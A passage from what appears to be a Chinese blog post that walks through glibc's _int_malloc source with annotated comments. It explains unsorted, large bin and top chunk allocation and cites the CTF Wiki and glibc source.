如果快速分配区块中仍有未释放的内存块，进行合并操作。</span></span><br><span class="line">  <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="大循环"><a href="#大循环" class="headerlink" title="大循环"></a>大循环</h4><p>如果程序执行到了这里，说明与chunk大小一致的bin没有符合要求的，就会进入下面的大循环。</p><p>在大循环中，主要完成了以下操作：</p><ul><li>按照FIFO的方式将unsored bin取出，如果是small request并且满足，满足就返回，不是的话就返回bin</li><li>从large bin分配所需内存</li></ul><p>虽然会首先使用large bin、top chunk来满足请求，但是在上面由于没有分配small bin，并没有对fast bin中的chunk进行合并，所以在这儿会进行fast bin chunk的合并，并使用一个大循环来尝试再次分配small bin chunk。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   处理最近释放或剩余的内存块，仅当它正好符合要求时才获取一个内存块，或者如果这是一个小内存请求，且内存块是最近的非精确匹配的剩余部分。将其他遍历过的内存块放入相应的分配区（bins）。请注意，这个步骤是程序中唯一一个将内存块放入分配区的地方。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   外部循环是必要的，因为我们可能直到 malloc 的最后阶段才意识到需要进行内存合并，所以必须执行合并操作并重试。这种情况最多发生一次，只有在需要扩展内存以满足一个 &quot;小&quot; 请求时才会发生。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h5 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h5><p>先遍历unsorted bin，遍历顺序为bk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="comment">// 进行unsorted chunk 大小检测，异常小或异常大都会导致出错</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">          || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                          chunk2mem (victim), av);</span><br><span class="line">      <span class="comment">// 获取当前遍历到的unsorted chunk的size</span></span><br><span class="line">      size = chunksize (victim);</span><br></pre></td></tr></table></figure><p>如果用户的请求是small bin chunk，那么首先考虑last remainder，如果unsorted bin中唯一</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果当前请求位于small chunks的大小范围内</span></span><br><span class="line">      <span class="comment">// 同时，unsorted bin里只有一个chunk，该chunk还是last_remainder</span></span><br><span class="line">      <span class="comment">// 并且该last_remainder的大小足够分配</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">          bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将该last_remainder 分割</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">// 同时，将这部分last_remainder放回unsorted bin里</span></span><br><span class="line">        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">        <span class="comment">// 并把剩余部分置为新的last_remainder</span></span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 最后对切割出来的chunk进行一些常规操作并返回</span></span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      <span class="comment">// 将当前遍历到的unsorted chunk从unsorted bin里断开</span></span><br><span class="line">      unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks (av);c</span><br></pre></td></tr></table></figure><p>如果取出的大小正好合适，就直接使用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果遍历到的这个unsorted chunk，它的大小与所申请的chunk大小刚刚好</span></span><br><span class="line">      <span class="comment">// 直接分配</span></span><br><span class="line">      <span class="keyword">if</span> (size == nb)</span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset (victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>判断大小，取出来的chunk放到small bin和large bin中，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将所遍历到的unsorted chunk，按照chunk大小，分类放置进small bin或large bin中</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">&#123;</span><br><span class="line">  victim_index = smallbin_index (size);</span><br><span class="line">  bck = bin_at (av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 将遍历到的unsorted chunk放置进large bin里</span></span><br><span class="line">  victim_index = largebin_index (size);</span><br><span class="line">  bck = bin_at (av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">  <span class="comment">// 如果large bin非空</span></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 如果遍历到的unsorted chunk的size，小于 large bin链上large chunks的最小size</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//将当前遍历到的unsorted chunk接到当前large bin的链尾</span></span><br><span class="line">      fwd = bck;</span><br><span class="line">      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">      <span class="comment">// 从large bin的链头到链尾，从size大的chunk到size小的chunk，依次遍历，直到找到第一个 大小不大于该unsorted chunk的 第一个chunk</span></span><br><span class="line">      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">      &#123;</span><br><span class="line">        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">        assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果当前遍历到的large chunk的大小刚好等于即将插入的unsorted chunk的大小</span></span><br><span class="line">      <span class="comment">// 总是选择插入到这个large chunk的后面</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line">      bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取出，并设定最多循环1000次</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="large-chunk"><a href="#large-chunk" class="headerlink" title="large chunk"></a>large chunk</h5><p>如果申请的chunk在large chunk范围内，就在对应的bin中从小到大扫描，找到合适的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// 如果请求的内存块大小大于 smallbin 范围，执行以下操作</span></span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">  <span class="comment">// 在对应 bin 中查找适合大小的内存块（以排序顺序）</span></span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 跳过扫描如果 bin 为空或最大的块太小</span></span><br><span class="line">  <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">long</span>)(victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;</span><br><span class="line">    <span class="comment">// 从 bin 中找到第一个适合大小的内存块</span></span><br><span class="line">    <span class="comment">// 反向遍历链表，直到找到第一个不小于所需chunk大小的chunk</span></span><br><span class="line">    victim = victim-&gt;bk_nextsize;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size = chunksize(victim)) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb))</span><br><span class="line">      victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 避免移除相同大小的内存块中的第一个，以减少跳表的操作</span></span><br><span class="line">    <span class="comment">// 如果最终取到的chunk不是该bin中的最后一个chunk，并且该chunk与其前面的chunk</span></span><br><span class="line">    <span class="comment">//的大小相同，那么我们就取其前面的chunk，这样可以避免调整bk_nextsize,fd_nextsize</span></span><br><span class="line">    <span class="comment">// 链表。因为大小相同的chunk只有一个会被串在nextsize链上。</span></span><br><span class="line">    <span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">      victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算剩余的内存块大小</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 bin 中移除选中的内存块</span></span><br><span class="line">    unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果剩余的内存块不足以分配（小于 MINSIZE）</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">      <span class="comment">// 将整块内存分配给用户</span></span><br><span class="line">      set_inuse_bit_at_offset(victim, size);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 否则，将内存块分割</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 分割内存块，将剩余部分放入未排序 bin 中</span></span><br><span class="line">      remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 确保未排序 bin 中没有破坏的指针</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      remainder-&gt;bk = bck;</span><br><span class="line">      remainder-&gt;fd = fwd;</span><br><span class="line">      bck-&gt;fd = remainder;</span><br><span class="line">      fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果剩余的内存块大小不在 smallbin 范围内，清除其 nextsize 指针</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 设置分配给用户的内存块头和脚，标记为已分配</span></span><br><span class="line">      set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      set_foot(remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查分配的内存块是否有效，并返回指向分配内存块的指针</span></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行到这里，说明没有从对应的合适的bin中获取合适的chunk，所以需要查找比当前bin更大的fast bin、small bin或者是large bin。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">++idx;</span><br><span class="line">      <span class="comment">// 获取对应的bin</span></span><br><span class="line">      bin   = bin_at(av, idx);</span><br><span class="line">      <span class="comment">// 获取当前索引在binmap中的block索引</span></span><br><span class="line">      <span class="comment">// #define idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)  ,BINMAPSHIFT=5</span></span><br><span class="line">      <span class="comment">// Binmap按block管理，每个block为一个int，共32个bit，可以表示32个bin中是否有空闲chunk存在</span></span><br><span class="line">      <span class="comment">// 所以这里是右移5</span></span><br><span class="line">      block = idx2block(idx);</span><br><span class="line">      <span class="comment">// 获取当前块大小对应的映射，这里可以得知相应的bin中是否有空闲块</span></span><br><span class="line">      <span class="built_in">map</span>   = av-&gt;binmap[ block ];</span><br><span class="line">      <span class="comment">// #define idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line">      <span class="comment">// 将idx对应的比特位设置为1，其它位为0</span></span><br><span class="line">      bit   = idx2bit(idx);</span><br><span class="line">      <span class="keyword">for</span> (;;) &#123;</span><br></pre></td></tr></table></figure><p>找到合适的map</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Skip rest of block if there are no more set bits in this block.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 如果bit&gt;map，则表示该 map 中没有比当前所需要chunk大的空闲块</span></span><br><span class="line"><span class="comment">// 如果bit为0，那么说明，上面idx2bit带入的参数为0。</span></span><br><span class="line"><span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 寻找下一个block，直到其对应的map不为0。</span></span><br><span class="line">        <span class="comment">// 如果已经不存在的话，那就只能使用top chunk了</span></span><br><span class="line">        <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">            <span class="keyword">goto</span> use_top;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[ block ]) == <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 获取其对应的bin，因为该map中的chunk大小都比所需的chunk大，而且</span></span><br><span class="line">    <span class="comment">// map本身不为0，所以必然存在满足需求的chunk。</span></span><br><span class="line">    bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">    bit = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到合适的bin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line"><span class="comment">// 从当前map的最小的bin一直找，直到找到合适的bin。</span></span><br><span class="line"><span class="comment">// 这里是一定存在的</span></span><br><span class="line"><span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    bin = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    assert(bit != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line"><span class="comment">// 获取对应的bin</span></span><br><span class="line">victim = last(bin);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line"><span class="comment">// 如果victim=bin，那么我们就将map对应的位清0，然后获取下一个bin</span></span><br><span class="line"><span class="comment">// 这种情况发生的概率应该很小。</span></span><br><span class="line"><span class="keyword">if</span> (victim == bin) &#123;</span><br><span class="line">    av-&gt;binmap[ block ] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">    bin                 = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取出chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取对应victim的大小</span></span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line">    <span class="comment">// 计算分割后剩余的大小</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="comment">// 如果分割后不够一个chunk怎么办？</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="comment">// 如果够，尽管分割</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 计算剩余的chunk的偏移</span></span><br><span class="line">        remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">           have to perform a complete insert here.  */</span></span><br><span class="line">        <span class="comment">// 将剩余的chunk插入到unsorted bin中</span></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd       = remainder;</span><br><span class="line">        fwd-&gt;bk       = remainder;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">        <span class="comment">// 如果在small bin范围内，就将其标记为remainder</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range(nb)) av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置victim的使用状态</span></span><br><span class="line">        set_head(victim,</span><br><span class="line">                 nb | PREV_INUSE |</span><br><span class="line">                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// 设置remainder的使用状态，这里是为什么呢？</span></span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        <span class="comment">// 设置remainder的大小</span></span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查</span></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="comment">// chunk状态转换到mem状态</span></span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用top-chunk"><a href="#使用top-chunk" class="headerlink" title="使用top chunk"></a>使用top chunk</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">       (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">       search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">       less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">       be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">       limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">       MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">       exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">       reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">       to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size   = chunksize(victim);</span><br><span class="line">    <span class="comment">// 如果分割之后，top chunk 大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">        av-&gt;top        = remainder;</span><br><span class="line">        <span class="comment">// 这里设置 PREV_INUSE 是因为 top chunk 前面的 chunk 如果不是 fastbin，就必然会和</span></span><br><span class="line">        <span class="comment">// top chunk 合并，所以这里设置了 PREV_INUSE。</span></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 否则，判断是否有 fast chunk</span></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">       here for all block sizes.  */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av)) &#123;</span><br><span class="line">        <span class="comment">// 先执行一次fast bin的合并</span></span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line">        <span class="comment">/* restore original bin index */</span></span><br><span class="line">        <span class="comment">// 判断需要的chunk是在small bin范围内还是large bin范围内</span></span><br><span class="line">        <span class="comment">// 并计算对应的索引</span></span><br><span class="line">        <span class="comment">// 等待下次再看看是否可以</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">            idx = smallbin_index(nb);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index(nb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="堆内存不够"><a href="#堆内存不够" class="headerlink" title="堆内存不够"></a>堆内存不够</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 否则的话，我们就只能从系统中再次申请一点内存了。</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="libc-calloc"><a href="#libc-calloc" class="headerlink" title="_libc_calloc"></a>_libc_calloc</h3><p>calloc 也是 libc 中的一种申请内存块的函数。在 <code>libc</code>中的封装为 <code>_libc_calloc</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  calloc(size_t n_elements, size_t element_size);</span></span><br><span class="line"><span class="comment">  Returns a pointer to n_elements * element_size bytes, with all locations</span></span><br><span class="line"><span class="comment">  set to zero.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_calloc(<span class="type">size_t</span>, <span class="type">size_t</span>);</span><br></pre></td></tr></table></figure><p>未完待续。。。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/malloc/#__libc_malloc">申请内存块 - CTF Wiki (ctf-wiki.org)</a></li><li><a href="https://elixir.bootlin.com/glibc/glibc-2.24/source/malloc/malloc.c#L4249">malloc.c - malloc&#x2F;malloc.c - Glibc source code (glibc-2.24) - Bootlin</a></li><li><a href="https://blog.csdn.net/Plus_RE/article/details/79265805">Glibc：浅谈 malloc_consolidate() 函数具体实现-CSDN博客</a></li><li>[heap - 7 - _int_malloc 源码及其部分分析 | Kiprey’s Blog](<a href="https://kiprey.github.io/2020/04/heap-7-">https://kiprey.github.io/2020/04/heap-7-</a> 